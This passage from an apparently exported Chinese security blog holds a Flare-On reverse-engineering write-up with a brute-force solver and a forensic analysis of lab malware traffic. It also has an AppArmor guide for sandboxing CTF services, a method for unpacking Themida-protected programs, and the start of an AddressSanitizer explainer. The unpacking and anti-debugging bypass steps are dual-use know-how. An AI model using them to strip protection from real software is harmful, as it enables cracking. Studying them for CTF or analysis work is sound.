class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[22]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpmaddwd ptr[2] , ptr[7] , ptr[11]7 *+ 11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[23] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[23] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[23] , ptr[15] , ptr[0]</span><br><span class="line">vpxor ptr[29] , ptr[23] , ptr[28]</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[23]^(ptr[23] &amp; ptr[18]) + p1) ^ 28</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[23]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpxor ptr[29] , ptr[24] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[24] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[24] , ptr[15] , ptr[0]</span><br><span class="line">vpxor ptr[29] , ptr[24] , ptr[28]</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[24]^(ptr[24] &amp; ptr[18]) + p1) ^ 28</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[24]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpxor ptr[29] , ptr[25] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[25] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[25] , ptr[15] , ptr[0]</span><br><span class="line">vpxor ptr[29] , ptr[25] , ptr[28]</span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[25]^(ptr[25] &amp; ptr[18]) + p1) ^ 28</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[25]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpshufb ptr[2] , ptr[2] , ptr[12]2 shuf 12</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpxor ptr[29] , ptr[26] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[26] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[26] , ptr[15] , ptr[0]17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[26]^(ptr[26] &amp; ptr[18]) + p1)</span><br><span class="line">vpxor ptr[29] , ptr[26] , ptr[28](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[26]^(ptr[26] &amp; ptr[18]) + p1) ^ 28</span><br><span class="line"></span><br><span class="line">vpermd ptr[17] , ptr[29] , ptr[19]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[26]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x07</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x19</span><br><span class="line">vpor ptr[15] , ptr[29] , ptr[30]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x15</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x0B</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line">vpslld ptr[29] , ptr[17] , 0x1A</span><br><span class="line">vpsrld ptr[30] , ptr[17] , 0x06</span><br><span class="line">vpor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpxor ptr[15] , ptr[15] , ptr[29]</span><br><span class="line"></span><br><span class="line">vpermd ptr[2] , ptr[2] , ptr[13]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vpxor ptr[29] , ptr[27] , ptr[16]</span><br><span class="line">vpand ptr[30] , ptr[27] , ptr[18]</span><br><span class="line">vpxor ptr[29] , ptr[29] , ptr[30]</span><br><span class="line">vpaddd ptr[15] , ptr[29] , ptr[15]</span><br><span class="line">vpaddd ptr[27] , ptr[15] , ptr[0](17 ror 25)  ^ (17 ror 11) ^ (17 ror 6) + ~ptr[27]^(ptr[27] &amp; ptr[18]) + p1) </span><br><span class="line">;vpxor ptr[29] , ptr[27] , ptr[28]</span><br><span class="line">;vpermd ptr[17] , ptr[29] , ptr[19]</span><br><span class="line">vpxor ptr[20] , ptr[20] , ptr[27]</span><br><span class="line"></span><br><span class="line">vmovdqu_mm ptr[19] , 0x0000000000000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</span><br><span class="line">vpand ptr[20] , ptr[20] , ptr[19]</span><br><span class="line">vmovdqu_mm ptr[31] , 0x2176620C3A5C0F290B583618734F07102E332623780E59150C05172D4B1B1E22</span><br></pre></td></tr></table></figure><p>输入参命令行参数传递。两个参数，第一个参数 9字节，程序中是明文校验。第二个参数32字节，通过反解VM代码获得的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">table &#x3D; map(ord,string.letters+string.digits)</span><br><span class="line">def crack(check):</span><br><span class="line">  t &#x3D; [0x00, 0x10, 0x13, 0x04, 0xBF, 0xBF, 0xB9, 0xB9]</span><br><span class="line">  for a in table:</span><br><span class="line">    for b in table:</span><br><span class="line">      for c in table:</span><br><span class="line">        for d in table:</span><br><span class="line">          a1 &#x3D; (t[a&gt;&gt;4]+a)&amp;0xff</span><br><span class="line">          b1 &#x3D; (t[b&gt;&gt;4]+b)&amp;0xff</span><br><span class="line">          c1 &#x3D; (t[c&gt;&gt;4]+c)&amp;0xff</span><br><span class="line">          d1 &#x3D; (t[d&gt;&gt;4]+d)&amp;0xff</span><br><span class="line">          if ((a1*0x40+b1)*0x1000+(c1*0x40+d1)) &amp;0xffffff &#x3D;&#x3D; check:</span><br><span class="line">            print &#39;&#39;.join(map(chr,[a,b,c,d]))</span><br><span class="line">            return</span><br><span class="line">  print &#39;nope&#39;</span><br><span class="line">  </span><br><span class="line">def main():</span><br><span class="line">  for i in [0x7070b2,0xac01d2,0x5e610a,0xa72aa8,0x081c86,0x1ae845,0xc829b2,0xf3a11e]:</span><br><span class="line">    crack(i)</span><br><span class="line">  print &#39;end.&#39;</span><br></pre></td></tr></table></figure><h2 id="12-help"><a href="#12-help" class="headerlink" title="12 help"></a>12 help</h2><p>12题就比较蛋疼了…显示内存取证与流量分析</p><p>目说明中说环境crash了，直接windbg加载dmp文件，<code>!analyze -v</code>，原来是驱动man.sys导致的crash，把man.sys搞出来，PE头部已经丢了。里面还有个dll，根据调试信息是m.dll，而且发现其调试信息中的路径与man.sys类似，搜了下，内存里还加载过c.dll、n.dll、k.dll、s.dll、f.dll、driver1.sys。不过后面几个pe文件只有pe头部及小量的代码，大部分代码部分缺失。<br>根据调试信息及简单分析pe文件功能如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">drive1.sys   shellcode  \\??\FLSC</span><br><span class="line">man.sys id</span><br><span class="line">m.dll   cd   listen port 4444    \\.\FLID</span><br><span class="line">s.dll   screenshot</span><br><span class="line">n.dll   network</span><br><span class="line">f.dll   file</span><br><span class="line">c.dll   crypto</span><br><span class="line">k.dll   keylog</span><br></pre></td></tr></table></figure><p>简单看了下流量包，确定主控端ip为192.168.1.243，victim ip为192.168.1.244。<br>开始对比分析流量，发现端口4444,6666,7777,8888为之间通讯端口。4444端口为控制指令类数据，其它三个端口为victim向外传送的数据。网络包中的数据基本都加了一层异或处理，可以从4444端口的对比发现，6666及8888之间同一数据发两次，一次加了异或，一次没加，7777端口数据包较多，中间夹杂没加异或的数据包。</p><p>通过4444端口信息很简单就能解了最外层的异或。前4字节是数据长度，然后是4字节的指令，其它部分功能未知，应该是4字节+4字节+4字节子数据长度+子数据+unknow的结构。<br>有了外层数据包的编码方式，7777端口的数据就好解了，原来是bmp图片数据，去掉其中的未编码的数据，将<code>\r\n</code>替换成<code>\n</code>，然后将数据包分成各文件，根据异或值，填充下缺失的个别字节，然后解码去掉表示长度的4字节，图片就解码好了。图片是屏幕截图，有些操作命令行的，有些web浏览器的，最主要是打开keepass的操作，最后的图如下：</p><p>加图<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190903010712.bmp" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190903010712.bmp"></a></p><p>根据图片内容，flag就在keepass的密码项中了。</p><p>又看了下其它的网络包，4444端口还发送了个文件和keepass的数据库名，文件应该就是上面说的driver1.sys，keepass数据库名应该是查找文件路径。<br>6666端口应该是发送keepass的数据库文件。</p><p>当时做题时漏了8888端口。于是开始开始在dmp文件中找keepass的信息，找到了数据库文件内容及加密过的masterkey和transfer_masterkey和对应的sessoion_key。于是乎就想办法解码原始key，看了keepass的源码，拿到了当前用户的masterkey，开始研究DPAPI。最后发现keepass的内存加密用了<code>CRYPTPROTECTMEMORY_SAME_PROCESS</code>标志，加入了进程信息，然后并不知参与加密的进程信息是什么，陷入僵局。</p><p>重新理思路，感觉应该漏了什么，通过<code>volatility</code>查看网络连接情况，发现漏了8888端口。此端口传送键盘记录信息，解了最外层的异或，子数据包并未能完全解码。子数据包编码方式与6666端口一致，通过keepass的数据文件内容，尝试异或解码，只解码部分数据，似乎编码加入了反馈机制。8888端口最后传送的就是keepass打开数据库时的键盘记录，传送的数据中可以正确解码标题部分<code>Open Database - keys.kdb</code>。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> flare-on </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在CTF Pwn下使用AppArmor做权限隔离</title>
      <link href="AppArmor-Pwn-Env.html"/>
      <url>AppArmor-Pwn-Env.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>最近接触了下AppArmor以及刚好最近部署某比赛，突然不想用docker做权限隔离，所以做了个记录</p><h2 id="AppArmor"><a href="#AppArmor" class="headerlink" title="AppArmor"></a>AppArmor</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><code>sudo apt-get install apparmor-profiles apparmor-utils</code></p><h3 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件"></a>创建配置文件</h3><p>在生成配置文件前，需要做个软连接，因为aa-autodep是通过Path去寻找目标程序的。所以我这里先</p><p><code>sudo ln -s /home/binfile /usr/local/bin/binfile</code></p><p>然后..</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/apparmor.d/</span><br><span class="line">sudo aa-autodep binfile</span><br></pre></td></tr></table></figure><p>此刻 /etc/apparmor.d 目录下就会生成一个 home.binfile 的文件，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Last Modified: Tue Aug  6 18:49:37 2019</span><br><span class="line">#include &lt;tunables&#x2F;global&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;home&#x2F;binfile flags&#x3D;(complain) &#123;</span><br><span class="line">  #include &lt;abstractions&#x2F;base&gt;</span><br><span class="line"></span><br><span class="line">  &#x2F;home&#x2F;binfile mr,</span><br><span class="line">  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-*.so mr,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="切换为-Complain-模式"><a href="#切换为-Complain-模式" class="headerlink" title="切换为 Complain 模式"></a>切换为 Complain 模式</h3><p><code>sudo aa-complain home.binaryname</code></p><p>紧接着正常运行程序以及exploit</p><h3 id="配置规则"><a href="#配置规则" class="headerlink" title="配置规则"></a>配置规则</h3><p>用<code>sudo aa-logprof</code> 生成记录运行过程中的正常日志</p><p>生成的规则如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># Last Modified: Tue Aug  6 19:39:38 2019</span><br><span class="line">#include &lt;tunables&#x2F;global&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;home&#x2F;hub flags&#x3D;(complain) &#123;</span><br><span class="line">  #include &lt;abstractions&#x2F;base&gt;</span><br><span class="line"></span><br><span class="line">  &#x2F;bin&#x2F;dash cx -&gt; &#x2F;bin&#x2F;dash,</span><br><span class="line">  &#x2F;bin&#x2F;dash mr,</span><br><span class="line">  &#x2F;home&#x2F;hub mr,</span><br><span class="line">  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-*.so mr,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  profile &#x2F;bin&#x2F;dash flags&#x3D;(complain) &#123;</span><br><span class="line">    #include &lt;abstractions&#x2F;base&gt;</span><br><span class="line"></span><br><span class="line">    &#x2F;bin&#x2F;cat mrix,</span><br><span class="line">    &#x2F;bin&#x2F;dash mr,</span><br><span class="line">    &#x2F;bin&#x2F;ls mrix,</span><br><span class="line">    &#x2F;home&#x2F; r,</span><br><span class="line">    &#x2F;home&#x2F;* r,</span><br><span class="line">    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-*.so mr,</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于自动生成配置文件并不是那么完美，因此我们要手动修改。</p><ol><li>由于远程需要，需要加上network inet stream</li><li>我仅仅需要读取 flag，因此需要修改可读文件目录</li></ol><p>最后修改如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;tunables&#x2F;global&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;home&#x2F;hub &#123;</span><br><span class="line">  #include &lt;abstractions&#x2F;base&gt;</span><br><span class="line"></span><br><span class="line">  network inet stream,</span><br><span class="line">&#x2F;bin&#x2F;dash mrix,</span><br><span class="line">  &#x2F;bin&#x2F;bash mrix,</span><br><span class="line">  &#x2F;bin&#x2F;cat mrix,</span><br><span class="line">  &#x2F;bin&#x2F;ls mrix,</span><br><span class="line">  &#x2F;usr&#x2F;bin&#x2F;id mrix,</span><br><span class="line">  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-*.so mr,</span><br><span class="line">  &#x2F;tmp&#x2F;server mr,</span><br><span class="line">  &#x2F;tmp&#x2F; r,</span><br><span class="line">  &#x2F;tmp&#x2F;flag r,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ^&#x2F;bin&#x2F;bash &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当修改完配置文件，我们需要将它导入内核使用：</p><p><code>apparmor_parser -r /etc/apparmor.d/home.hub</code></p><p>或者</p><p><code>aa-enforce /etc/apparmor.d/home.hub</code></p><p>其实说来这个配置文件就是一个白名单，意味着如果一些内容多写进到白名单里，可能会造成权限配置不当。</p><h2 id="与xinetd-合用"><a href="#与xinetd-合用" class="headerlink" title="与xinetd 合用"></a>与xinetd 合用</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>由于用来配置 ctf pwn,所以我们还需一个守护进程，这里我选择xinetd，配置文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">service pwn_server</span><br><span class="line">&#123;</span><br><span class="line">socket_type &#x3D; stream</span><br><span class="line">protocol &#x3D; tcp</span><br><span class="line">user &#x3D; root</span><br><span class="line">group &#x3D; root</span><br><span class="line">server &#x3D; &#x2F;home&#x2F;limit.sh</span><br><span class="line">wait &#x3D; no</span><br><span class="line">per_source &#x3D; 50</span><br><span class="line">banner &#x3D; &#x2F;home&#x2F;banner</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>limit.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line">ulimit -u 10000</span><br><span class="line">ulimit -c 0</span><br><span class="line">ulimit -v 7340032</span><br><span class="line">/home/hub</span><br></pre></td></tr></table></figure><p>并在 <strong>/etc/services</strong> 加上相应的服务名称与端口，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwn_server      12435&#x2F;tcp</span><br><span class="line">tcpmux          1&#x2F;tcp                           # TCP port service multiplexer</span><br><span class="line">echo            7&#x2F;tcp</span><br><span class="line">echo            7&#x2F;udp</span><br></pre></td></tr></table></figure><p>最后 service xinetd start 启动即可。 </p><p>冲！XD</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AppArmor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个脱 themida 强壳的特殊方法</title>
      <link href="easy-way-to-unpacking-theminda2.x.html"/>
      <url>easy-way-to-unpacking-theminda2.x.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间，干一个活的时候遇到了一个强壳 Themida，简称 TMD 壳。搜了一下资料</p><p>这个壳的特点就是会在关键代码处采用 vmp 保护，如 vmp 保护程序入口。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505001531.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505001531.png"></a></p><p>好在我遇到的这个壳没有对 oep 进行处理。所以还是比较好找到 oep的。</p><h1 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h1><p>脱壳过程中找 oep 是一个关键的的步骤，找 oep 有许多的方法，但是其实大都对 TMD 这种强壳没有什么帮助？（可能是我脱的壳比较少）。另外还有一种常见的方法，就是找关键 api 然后回溯，找到真正的入口，下硬件断点。</p><p>我遇到的这个程序是 msvcrt 编写的程序。</p><p>我们知道在 MSVC 中程序编译器会为全局和静态函数生成相应的初始化器，并把他们的地址放在一个表（table）中，这个表会在 _cinit() 初始化 CRT 的时候生成。在 PE 结构中，这个表通常在 .data 段的起始位置。<br>从 Entry Point 到 main 函数过程中，在完成了_setargv() 以及_setenvp() 之后，进入到_cinit 函数。<br>_cinit 函数很短，大致上分为三个步骤：</p><ol><li><p>_fpmath() 或者 (*_FPinit)();</p></li><li><p>_initterm( __xi_a, __xi_z );</p></li><li><p>_initterm( __xc_a, __xc_z );</p></li></ol><p>第一步 是可选的，_FPinit 主要用来初始化浮点运算。只有当用户写的代码中出现了浮点运算，_FPinit 才会被定义。<br>第二步和第三步 是分别对C和C++程序做初始化。_initterm 接受两个指针作为参数，这两个指针中间的内存区域是一张函数指针表。_initterm 会从第一个指针开始，慢慢向后寻找，直到第二个指针结束，中间如果找到了一块内存表示一个函数指针，则执行该函数。</p><p>关键的地方就是在程序需会走到  <code>msvcrt._initterm</code> ，所以我们可以对这个位置下条件断点。</p><h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><p>首先找到自己要的关键模块，找到模块的区段地址。<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505002653.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505002653.png"></a></p><p>然后下好 条件断点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bp msvcrt._initterm</span><br><span class="line">bpcnd msvcrt._initterm, [esp]&lt; 0xd2d000+0x1000</span><br></pre></td></tr></table></figure><h2 id="寻找-oep"><a href="#寻找-oep" class="headerlink" title="寻找 oep"></a>寻找 oep</h2><p>执行，程序到达断点。<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505003110.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505003110.png"></a></p><p>此时程序到达断点，发现此时程序来到了 esp 符合条件的位置。 而此时的 esp 存储的地址就是 oep 附近，我们只需来到 esp 存maty储地址附近，往上回溯即可。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505003232.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190505003232.png"></a></p><h1 id="题外"><a href="#题外" class="headerlink" title="题外"></a>题外</h1><p>在用x64dbg 脱壳的过程中遇到了很强烈的反调试，然后我尝试用了<a href="https://github.com/x64dbg/ScyllaHide">ScyllaHide</a>这个插件解决了。</p><p>另外感谢 pizza 对我的帮助。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> revrse </tag>
            
            <tag> unpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASan and ASan in CTF(0ctf babyaegis)</title>
      <link href="ASan-and-ASan-in-CTF(0ctf-babyaegis).html"/>
      <url>ASan-and-ASan-in-CTF(0ctf-babyaegis).html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="About-AddressSanitizer-ASan"><a href="#About-AddressSanitizer-ASan" class="headerlink" title="About AddressSanitizer(ASan)"></a>About AddressSanitizer(ASan)</h1><p>AddressSanitizer 后文均简称为ASan 是 Google 开源的一个用于进行内存检测的工具，包括但可能不限于 Heap buffer overflow, Stack buffer overflow, Global buffer overflow 等等。</p><p>在 wiki 中就举了了四个例子，分别是</p><ol><li>Heap-use-after-free</li><li>Heap-buffer-overflow</li><li>Stack-buffer-overflow</li><li>Global-buffer-overflow</li></ol><p>除了学术上的建树，这个工具也曾发现了不少漏洞，如在知名的 j00r 的<a href="https://j00ru.vexillium.org/2014/01/ffmpeg-and-the-tale-of-a-thousand-fixes/">blog</a> 中提到的</p><p>关于 ASan 的核心实现在 wiki 也提到了，在我读了一些 paper 以及在 0ctf babyaegis 这个题目的调试也大概总结了一下：</p><h2 id="ASan-算法实现"><a href="#ASan-算法实现" class="headerlink" title="ASan 算法实现"></a>ASan 算法实现</h2><p>ASan 由两个主要部分构成，插桩和动态运行库( Run-time library )，插桩主要是针对在llvm编译器级别对访问内存的操作(store，load，alloca等)，将它们进行处理。动态运行库主要提供一些运行时的复杂的功能(比如poison/unpoison shadow memory)以及将malloc,free等系统调用函数hook住。其实该算法的思路很简单，如果想防住Buffer Overflow漏洞，只需要在每块内存区域右端（或两端，能防overflow和underflow）加一块区域（RedZone），使RedZone的区域的影子内存（Shadow Memory)设置为不可写即可。</p><p>+——————-+<br>|     redzone          |<br>+——————-+<br>|       mem              |<br>+——————-+<br>|     redzone          |<br>+——————-+<br>|       mem              |<br>+——————-+<br>|     redzone          |<br>+——————-+</p><h3 id="内存映射"><a href="#内存映射" 